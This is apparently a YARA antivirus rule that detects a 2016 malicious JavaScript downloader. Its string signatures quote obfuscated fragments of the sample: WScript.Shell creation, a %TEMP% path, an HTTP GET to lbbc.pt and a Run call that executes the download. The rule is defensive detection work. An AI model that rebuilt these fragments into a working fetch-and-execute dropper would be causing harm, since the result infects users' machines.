rule sig_20160427_a29b31e2c868095ff29c3955a27f7a45 {
  meta:
    description = "datamaliciousorder - file 20160427_a29b31e2c868095ff29c3955a27f7a45.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "977dc0137343fd1d1e02a32e5114eb64bddc43571d2eeef00b4640f157f5e157"

  strings:
    $s1  = "function SlsdbVtofz() {return JbjbgUlncn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"u6zexG2" ascii
    $s2  = "function SlsdbVtofz() {return JbjbgUlncn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"u6zexG2" ascii
    $s3  = "function TewqiZyfsg(TnacyNwcqw, RedmnFbsqb){EkejgNtfgd = EkejgNtfgd * 1; return TnacyNwcqw - RedmnFbsqb;};" fullword ascii
    $s4  = "var JbjbgUlncn = function UwvhjIbywl() {return ZygmiYvcvb[IswrpNsfer](\"WScript\"+\".Shell\");}(), KhswiRoicl = 11;" fullword ascii
    $s5  = "NtwcmCiymw[JpgvsKconc](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var ZygmiYvcvb = this[\"WScript\"];" fullword ascii
    $s7  = "if (NtwcmCiymw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function NhxqaLlxur(){return IwhqmGrhtb + \"\";};" fullword ascii
    $s9  = "function PeuxeUlgwt() {return ((IntzgCwdme == true) && (IntzgCwdme == EotueZkxsd)) ? 1 : EkejgNtfgd;};" fullword ascii
    $s10 = "function FueugVwccl(IcbnqFxlhj) {var BclppChygm = (1, 2, 3, 4, 5, IcbnqFxlhj); return BclppChygm;};" fullword ascii
    $s11 = "LbicdXwfaa = true;" fullword ascii
    $s12 = "function YekljFithc(){return 23;};" fullword ascii
    $s13 = "EotueZkxsd = true; " fullword ascii
    $s14 = "var EotueZkxsd = false;" fullword ascii
    $s15 = "var LbicdXwfaa = false;" fullword ascii
    $s16 = "return TewqiZyfsg(RllfiNntbk, SjggqPjwjv);" fullword ascii
    $s17 = "function PngnaVvxco(OmnkwSbqxg){JbjbgUlncn[\"R\"+\"un\"](OmnkwSbqxg, EkejgNtfgd, EkejgNtfgd);};" fullword ascii
    $s18 = "var IntzgCwdme = false;" fullword ascii
    $s19 = "var FlelpAyrxf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function YlulsWqmvb(){return IswrpNsfer;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}